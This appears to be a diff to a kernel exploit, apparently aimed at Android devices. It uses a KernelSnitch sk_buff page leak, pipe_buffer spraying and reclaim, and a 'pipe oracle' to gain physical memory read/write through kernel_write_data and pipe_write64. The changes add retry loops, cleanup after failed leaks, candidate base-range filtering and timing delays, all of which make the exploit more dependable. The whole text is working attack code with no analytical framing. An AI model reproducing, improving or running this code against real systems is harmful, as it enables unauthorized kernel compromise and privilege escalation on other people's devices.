@@ -241,7 +241,26 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   run_kernelsnitch_bruteforce();
   uintptr_t leaked = cleanup_kernelsnitch();
   if (leaked == (uintptr_t)-1) {
-    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
+    pr_warning("pipe KernelSnitch sk_buff page leak failed; retryable\n");
+    /* Do not continue with an invalid direct-map base.  The old path kept
+     * shaping and reclaiming after a failed leak, which could leave the
+     * parent without a result-pipe record and made a clean retry ambiguous. */
+    close(skb_sv[0]);
+    close(skb_sv[1]);
+    /* pcp_sv was already closed before the leak scan.  Do not close those
+     * descriptor numbers again: cleanup_kernelsnitch() may have reused them
+     * for a live memfd/result pipe, and the stale double-close corrupted the
+     * retry state after a miss. */
+    close_ctx_memfds(&prep);
+    close_ctx_memfds(&spray);
+    close_ctx_memfds(&pre);
+    close_ctx_memfds(&post);
+    free_ctx_storage(&prep);
+    free_ctx_storage(&spray);
+    free_ctx_storage(&pre);
+    free_ctx_storage(&post);
+    free(buf);
+    return 0;
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -253,7 +272,13 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   }
 #endif
 
+#if PIPE_SHAPE_ROUNDS != 0
+  /* The root-first profile deliberately leaves the optional N/C/E shape
+   * arrays unallocated.  Calling the shaper with zero-initialized descriptors
+   * would resize fd 0 and can trip F_SETPIPE_SZ before the real reclaim pipes
+   * are prepared. */
   shape_pipe_cache();
+#endif
 
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     alloc_pipe_object(pipe_fds_drain[i]);
@@ -763,17 +788,29 @@ int install_pipe_physrw(int fd) {
   uintptr_t proof64_addr = proof_addr + 0x100;
   uint64_t seed64 = PHYS64_SEED;
   uint64_t next64 = PHYS64_NEXT;
-  kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64));
+  if (kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64)) !=
+      (ssize_t)sizeof(seed64)) {
+    pr_warning("phys step seed64 write failed\n");
+    return 0;
+  }
   physrw_read64_before = pipe_read64(fd, proof64_addr);
   physrw_read64_ok = physrw_read64_before == seed64;
   pr_info("phys step read64 done ok=%d value=%016zx\n",
           physrw_read64_ok, physrw_read64_before);
+  if (!physrw_read64_ok) {
+    pr_warning("phys step read64 proof mismatch\n");
+    return 0;
+  }
   physrw_write64_value = next64;
   physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
   kernel_read_data(
       fd, proof64_addr, &physrw_read64_after, sizeof(physrw_read64_after));
   physrw_write64_ok =
     physrw_write64_ok && physrw_read64_after == physrw_write64_value;
+  if (!physrw_write64_ok) {
+    pr_warning("phys step write64 proof mismatch\n");
+    return 0;
+  }
 
   return physrw_read_ok &&
          memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
@@ -935,14 +972,47 @@ int prepare_p0_pipe_oracle(void) {
   _Static_assert(sizeof(struct user_pipe_buffer) == 0x28,
                  "unexpected pipe_buffer size");
 
-  for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
-    p0_gate_holders[pipe_index][0] = -1;
-    p0_gate_holders[pipe_index][1] = -1;
-  }
-  p0_gate_holders_initialized = 1;
+  int max_attempts = 1;
+#ifdef APP_PIPE_PAGE_PREPARE_ATTEMPTS
+  max_attempts = APP_PIPE_PAGE_PREPARE_ATTEMPTS;
+#endif
+  for (int attempt = 1; attempt <= max_attempts; attempt++) {
+    if (attempt != 1) {
+      reset_pipe_attempt();
+    }
+    for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
+      p0_gate_holders[pipe_index][0] = -1;
+      p0_gate_holders[pipe_index][1] = -1;
+    }
+    p0_gate_holders_initialized = 1;
 
-  pipebuf_page_base = prepare_pipe_buffer_page();
+    pipebuf_page_base = prepare_pipe_buffer_page();
+    pr_info("p0 pipe page prepare attempt=%d/%d base=%016zx\n",
+            attempt, max_attempts, pipebuf_page_base);
+    if (is_direct_ptr(pipebuf_page_base)) {
+#if defined(APP_P0_PIPE_MIN_BASE) && defined(APP_P0_PIPE_MAX_BASE)
+      if (pipebuf_page_base < APP_P0_PIPE_MIN_BASE ||
+          pipebuf_page_base >= APP_P0_PIPE_MAX_BASE) {
+        pr_warning("p0 pipe page candidate rejected base=%016zx range=[%016llx,%016llx)\n",
+                   pipebuf_page_base,
+                   (unsigned long long)APP_P0_PIPE_MIN_BASE,
+                   (unsigned long long)APP_P0_PIPE_MAX_BASE);
+        reset_pipe_attempt();
+        continue;
+      }
+#endif
+      break;
+    }
+    if (attempt != max_attempts) {
+      pr_warning("p0 pipe page leak miss; refreshing pre-physical state\n");
+      /* Let the order-3 page allocator and pipe cache settle before the next
+       * fresh session.  Rapid back-to-back failed scans were the last point
+       * before the device dropped off ADB during a local run. */
+      usleep(500000);
+    }
+  }
   if (!is_direct_ptr(pipebuf_page_base)) {
+    reset_pipe_attempt();
     return 0;
   }
 
@@ -1049,9 +1119,12 @@ int verify_p0_pipe_oracle_gate(void) {
     return 1;
   }
   if (gate_hits == 0 && changed_pages == 0) {
-#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
-    close_p0_gate_holders();
-#endif
+    /*
+     * Keep the holder pipes available for a timing retry.  The caller may
+     * issue another gate trigger against the same prepared page;
+     * reset_pipe_attempt() owns the eventual cleanup when the fresh session
+     * is retired.
+     */
     return 0;
   }
   return -1;
